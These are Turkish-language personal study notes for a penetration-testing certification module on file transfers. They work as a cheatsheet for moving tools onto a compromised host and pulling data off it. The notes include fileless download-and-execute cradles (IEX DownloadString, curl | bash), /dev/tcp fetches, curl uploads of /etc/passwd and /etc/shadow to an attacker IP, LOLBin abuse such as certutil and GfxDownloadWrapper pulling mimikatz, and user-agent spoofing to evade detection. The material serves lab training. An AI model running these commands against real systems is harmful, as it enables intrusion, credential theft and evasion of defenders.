[← Tüm modüller](../README.md)

# 07 — File Transfers

HTB CPTS path'inin yedinci modülü için tuttuğum çalışma notları. Konu: **dosya transfer teknikleri** — bir hedefe foothold aldıktan sonra tool/exploit indirmek (download) veya veri çıkarmak (upload). Windows + Linux native araçları, programlama dilleri, Netcat/RDP/WinRM, encrypted transfer, Living off the Land (LOLBAS/GTFOBins) ve detection/evasion.

> **Not stratejisi:** Bu modül tamamen **komut cheatsheet'i** — her yöntemin download + upload varyantı. Senin için değeri "ortamda hangi araç varsa ona göre transfer yapabilmek" (muscle memory). O yüzden notu platforma (Windows/Linux) ve yöne (download/upload) göre tabloladım, her satır kopyalanabilir komut. Sınavda/sahada "wget yok, ne kullanayım?" anında bakılacak referans.

Notlar Türkçe, teknik terimler İngilizce bırakıldı. `ATTACKER` = saldırgan makine (Pwnbox), `TARGET` = ele geçirilmiş makine.

---

## İçindekiler

1. [Temel Prensip & md5sum Doğrulama](#1-temel-prensip--md5sum-doğrulama)
2. [Base64 (network'süz)](#2-base64-networksüz)
3. [Windows — Download](#3-windows--download)
4. [Windows — Upload](#4-windows--upload)
5. [Linux — Download](#5-linux--download)
6. [Linux — Upload](#6-linux--upload)
7. [Programlama Dilleriyle Transfer](#7-programlama-dilleriyle-transfer)
8. [Netcat / Ncat / /dev/tcp](#8-netcat--ncat--devtcp)
9. [WinRM & RDP](#9-winrm--rdp)
10. [Protected Transfer — Encryption](#10-protected-transfer--encryption)
11. [Sunucu Kurulumu — Catching Files](#11-sunucu-kurulumu--catching-files)
12. [Living off the Land — LOLBAS / GTFOBins](#12-living-off-the-land--lolbas--gtfobins)
13. [Detection & Evading](#13-detection--evading)
14. [Tek Bakışta: "X yok, ne kullanayım?"](#14-tek-bakışta-x-yok-ne-kullanayım)

---

## 1. Temel Prensip & md5sum Doğrulama

Her transfer sonrası **hash doğrula** — dosya bozulmadı mı:
```bash
# Linux
md5sum id_rsa
```
```powershell
# Windows
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
İki tarafta hash aynı = transfer sağlam.

> **APT örneği (Astaroth):** fileless attack — LNK → WMIC `/Format` → JS → Bitsadmin (download) → Certutil (base64 decode → DLL) → regsvr32. "Fileless" = dosya diske yazılmaz, memory'de çalışır. Bu modüldeki tekniklerin gerçek dünyada zincirlenmesi.

---

## 2. Base64 (network'süz)

Terminal erişimi varsa, network olmadan dosya taşı. **Limit:** cmd.exe max 8191 karakter; çok büyük dosyada web shell patlar.

**Encode (kaynak) → Decode (hedef):**
```bash
# Linux encode
cat id_rsa | base64 -w 0; echo
# Linux decode
echo -n '<base64>' | base64 -d > id_rsa
```
```powershell
# Windows decode (base64 → dosya)
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64>"))
# Windows encode (dosya → base64)
[Convert]::ToBase64String((Get-Content -path "C:\...\hosts" -Encoding byte))
```

---

## 3. Windows — Download

### PowerShell Web (Net.WebClient)
```powershell
# DownloadFile (diske yazar)
(New-Object Net.WebClient).DownloadFile('<URL>','C:\...\PowerView.ps1')
(New-Object Net.WebClient).DownloadFileAsync('<URL>','<out>')

# DownloadString — FILELESS (memory'de çalıştır)
IEX (New-Object Net.WebClient).DownloadString('<URL>')
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
```
`DownloadData(Async)`, `OpenRead` de var.

### Invoke-WebRequest (PS 3.0+, alias: iwr/curl/wget) — yavaş
```powershell
Invoke-WebRequest <URL> -OutFile PowerView.ps1
```
**Sık hatalar:**
```powershell
# IE first-launch config hatası → -UseBasicParsing
Invoke-WebRequest <URL> -UseBasicParsing | IEX
# SSL/TLS trust hatası → cert validation bypass
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB (TCP/445)
```bash
# ATTACKER: Impacket SMB server
sudo impacket-smbserver share -smb2support /tmp/smbshare
# Auth gerekiyorsa (yeni Windows guest access'i bloklar):
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
```cmd
:: TARGET
copy \\192.168.220.133\share\nc.exe
:: auth ile:
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP (TCP/21)
```bash
# ATTACKER: Python FTP server (anonymous default)
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```
```powershell
# TARGET
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt','C:\...\ftp-file.txt')
```
```cmd
:: Non-interactive shell → FTP command file
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

## 4. Windows — Upload

### PowerShell Web Upload
```bash
# ATTACKER: upload-capable server
pip3 install uploadserver
python3 -m uploadserver        # port 8000, /upload endpoint
```
```powershell
# TARGET: PSUpload.ps1 (Invoke-RestMethod)
IEX(New-Object Net.WebClient).DownloadString('<PSUpload.ps1 URL>')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\...\hosts
```

### Base64 Web Upload (Netcat ile yakala)
```powershell
# TARGET
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\...\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
```bash
# ATTACKER
nc -lvnp 8000      # base64 yakala
echo <base64> | base64 -d -w 0 > hosts
```

### SMB Upload — WebDAV (SMB 445 bloklandığında)
SMB önce 445 dener, yoksa HTTP'ye düşer. WebDAV = SMB over HTTP (RFC 4918).
```bash
# ATTACKER: WebDAV server
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
```cmd
:: TARGET — DavWWWRoot özel keyword (root'a bağlanır)
dir \\192.168.49.128\DavWWWRoot
copy C:\...\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\...\SourceCode.zip \\192.168.49.129\sharefolder\
```

### FTP Upload
```bash
sudo python3 -m pyftpdlib --port 21 --write      # --write şart
```
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts','C:\...\hosts')
```

---

## 5. Linux — Download

```bash
# wget / curl
wget <URL> -O /tmp/LinEnum.sh          # -O büyük O
curl -o /tmp/LinEnum.sh <URL>          # -o küçük o

# FILELESS (pipe ile çalıştır — diske yazmaz*)
curl <URL>/LinEnum.sh | bash
wget -qO- <URL>/helloworld.py | python3
#  *mkfifo gibi bazı payload'lar yine de temp dosya yazabilir

# Bash /dev/tcp (hiçbir araç yoksa, Bash 2.04+ --enable-net-redirections)
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3

# SSH / SCP (ATTACKER'da ssh server açık olmalı)
sudo systemctl enable ssh && sudo systemctl start ssh
scp plaintext@192.168.49.128:/root/myroot.txt .
```

---

## 6. Linux — Upload

```bash
# Web upload (HTTPS, self-signed)
sudo python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
# TARGET:
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

# Basit web server (TARGET'ta çalıştır → ATTACKER wget'ler)
python3 -m http.server              # :8000
python2.7 -m SimpleHTTPServer       # :8000
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000
#  Not: inbound bloklanabilir — bu "upload" değil, ATTACKER'ın TARGET'tan çekmesi

# SCP upload (SSH 22 outbound açıksa)
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

---

## 7. Programlama Dilleriyle Transfer

Hedefte hangi dil varsa (Python/PHP/Ruby/Perl Linux'ta yaygın; JS/VBScript Windows'ta).

**Download:**
```bash
# Python 2 / 3
python2.7 -c 'import urllib;urllib.urlretrieve("<URL>","LinEnum.sh")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>","LinEnum.sh")'

# PHP
php -r '$f=file_get_contents("<URL>");file_put_contents("LinEnum.sh",$f);'
php -r '$l=@file("<URL>");foreach($l as $ln){echo $ln;}' | bash   # fileless

# Ruby / Perl
ruby -e 'require "net/http";File.write("LinEnum.sh",Net::HTTP.get(URI.parse("<URL>")))'
perl -e 'use LWP::Simple;getstore("<URL>","LinEnum.sh");'
```
```cmd
:: JavaScript (wget.js) + VBScript (wget.vbs) → cscript ile
cscript.exe /nologo wget.js <URL> PowerView.ps1
cscript.exe /nologo wget.vbs <URL> PowerView2.ps1
```

**Upload (Python3 requests):**
```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---

## 8. Netcat / Ncat / /dev/tcp

Firewall yönüne göre: TARGET dinler veya ATTACKER dinler.

**Yöntem 1 — TARGET listener (ATTACKER → TARGET):**
```bash
# TARGET dinle
nc -l -p 8000 > SharpKatz.exe              # original nc
ncat -l -p 8000 --recv-only > SharpKatz.exe # ncat (--recv-only: bitince kapat)
# ATTACKER gönder
nc -q 0 192.168.49.128 8000 < SharpKatz.exe    # -q 0: bitince kapat
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

**Yöntem 2 — ATTACKER listener (inbound firewall bloklandığında):**
```bash
# ATTACKER dinle
sudo nc -l -p 443 -q 0 < SharpKatz.exe
sudo ncat -l -p 443 --send-only < SharpKatz.exe
# TARGET al
nc 192.168.49.128 443 > SharpKatz.exe
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
# nc yoksa TARGET'ta /dev/tcp:
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

---

## 9. WinRM & RDP

### PowerShell Remoting / WinRM (HTTP 5985, HTTPS 5986)
HTTP/HTTPS/SMB yoksa. Admin / Remote Management Users gerekir.
```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
$Session = New-PSSession -ComputerName DATABASE01
# local → remote session
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
# remote session → local
Copy-Item -Path "C:\...\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP (3389)
Copy-paste veya local folder mount:
```bash
# Linux → RDP, klasör mount
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/user/htb/filetransfer
# RDP içinde: \\tsclient\ ile eriş
```
Windows'tan: `mstsc.exe`.

---

## 10. Protected Transfer — Encryption

> Hassas veri (NTDS.dit, cred, enum) transfer edilirken **şifrele** — IDS plaintext yakalarsa rapora kötü yansır. **PII/finansal veri exfil etme** — DLP testi için dummy data kullan.

**Windows — Invoke-AESEncryption.ps1:**
```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt   # → .aes
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes
```

**Linux — OpenSSL:**
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc        # encrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd          # decrypt
```
> Her müşteri için güçlü + unique parola — bir parola sızarsa diğer dosyalar güvende kalsın.

---

## 11. Sunucu Kurulumu — Catching Files

HTTP/S = en yaygın (firewall'dan geçer, transit şifreli olabilir).

**Nginx PUT upload (Apache'den güvenli — PHP auto-execute yok):**
```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
# /etc/nginx/sites-available/upload.conf:
#   server { listen 9001; location /SecretUploadDirectory/ { root /var/www/uploads; dav_methods PUT; } }
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default       # port 80 çakışması varsa
sudo systemctl restart nginx.service
# upload:
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```
> Directory listing kapalı olmalı (Nginx default kapalı, Apache açık → exfil dosyaları görünür).

---

## 12. Living off the Land — LOLBAS / GTFOBins

**LOLBin** = orijinal amacı dışında kullanılabilen meşru binary. Application whitelisting / logging'i atlatır.
- **LOLBAS** (Windows): https://lolbas-project.github.io — `/download`, `/upload` ara
- **GTFOBins** (Linux): https://gtfobins.github.io — `+file download`, `+file upload` ara

**Windows LOLBins:**
```powershell
# Bitsadmin (BITS — host/network utilization'a göre akıllı)
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\...\nc.exe
Import-Module bitstransfer; Start-BitsTransfer -Source "<URL>/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

# Certutil (de facto wget — ama AMSI artık yakalıyor)
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
certutil -urlcache -split -f <URL>/nc.exe

# CertReq (upload)
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini

# GfxDownloadWrapper (Intel driver — whitelisting atlatabilir)
GfxDownloadWrapper.exe "<URL>/mimikatz.exe" "C:\Temp\nc.exe"
```

**Linux GTFOBin (OpenSSL — nc style):**
```bash
# ATTACKER: cert + server
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
# TARGET: indir
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

---

## 13. Detection & Evading

### Detection — User-Agent imzaları
Her HTTP client'ın UA string'i var. Transfer araçları UA'dan yakalanır:
| Araç | User-Agent |
|---|---|
| Invoke-WebRequest | `Mozilla/5.0 (...) WindowsPowerShell/5.1...` |
| WinHttpRequest | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` |
| Certutil | `Microsoft-CryptoAPI/10.0` |
| BITS | `Microsoft BITS/7.8` |

> Defender: legitimate UA whitelist oluştur → SIEM'de anomali avla. Command-line whitelisting (blacklist'ten robust — case obfuscation ile bypass edilir).

### Evading
```powershell
# 1. User-Agent değiştir (iç ağda Chrome kullanılıyorsa meşru görünür)
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
# UA listesi: [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties()
```
```powershell
# 2. LOLBin kullan (whitelisting PowerShell/nc'yi bloklarsa)
GfxDownloadWrapper.exe "<URL>/mimikatz.exe" "C:\Temp\nc.exe"
```
> Evasion = UA spoofing + LOLBin (misplaced trust binary) + encryption. 03-Nmap ve 01 modüllerindeki evasion mantığıyla aynı çizgi.

---

## 14. Tek Bakışta: "X yok, ne kullanayım?"

| Senaryo | Çözüm |
|---|---|
| **Windows, internet var** | `(New-Object Net.WebClient).DownloadFile()` / `IEX DownloadString` (fileless) |
| **Windows, IWR hatası** | `-UseBasicParsing` (IE) · `ServerCertificateValidationCallback={$true}` (SSL) |
| **Windows, PowerShell bloklu** | Certutil / Bitsadmin / LOLBin (GfxDownloadWrapper) / cscript+JS |
| **Linux, standart** | `wget -O` / `curl -o` / fileless `curl \| bash` |
| **Linux, hiçbir araç yok** | Bash `/dev/tcp` · `cat < /dev/tcp/ip/port` |
| **Network yok, terminal var** | Base64 encode/decode |
| **SMB 445 açık** | impacket-smbserver + `copy`/`net use` |
| **SMB bloklu** | WebDAV (wsgidav) + `DavWWWRoot` |
| **Sadece FTP** | pyftpdlib (+`--write` upload için) |
| **Sadece SSH/22** | scp |
| **Sadece WinRM/5985** | New-PSSession + Copy-Item -ToSession/-FromSession |
| **RDP var** | copy-paste / `\\tsclient\` folder mount |
| **nc yok, firewall inbound bloklu** | ATTACKER listener + TARGET `/dev/tcp` |
| **Hassas veri** | AES (Invoke-AESEncryption) / OpenSSL ÖNCE şifrele |
| **Whitelisting / logging var** | LOLBAS/GTFOBins + UA spoof |

**Her zaman:** transfer sonrası `md5sum` / `Get-FileHash` ile doğrula.

---

## Kaynaklar

- **HTB Academy** — File Transfers (CPTS path, Module 07)
- **LOLBin projeleri:** LOLBAS (lolbas-project.github.io), GTFOBins (gtfobins.github.io)
- **Araçlar:** Impacket (smbserver), pyftpdlib, uploadserver, wsgidav+cheroot, Netcat/Ncat, OpenSSL, Invoke-AESEncryption.ps1, PSUpload.ps1
- **Native:** PowerShell (Net.WebClient, Invoke-WebRequest, BITS), Certutil, Bitsadmin, cscript (JS/VBScript), wget/curl, scp, /dev/tcp
- **Referans:** Harmj0y PowerShell download cradles, Microsoft Astaroth APT blog, PSUserAgent

Notlar kişisel çalışma amacıyla tutuldu ve halka açık paylaşıldı.
Hata veya eksik gördüğünüz yerler için issue açabilirsiniz.

[← Tüm modüller](../README.md)
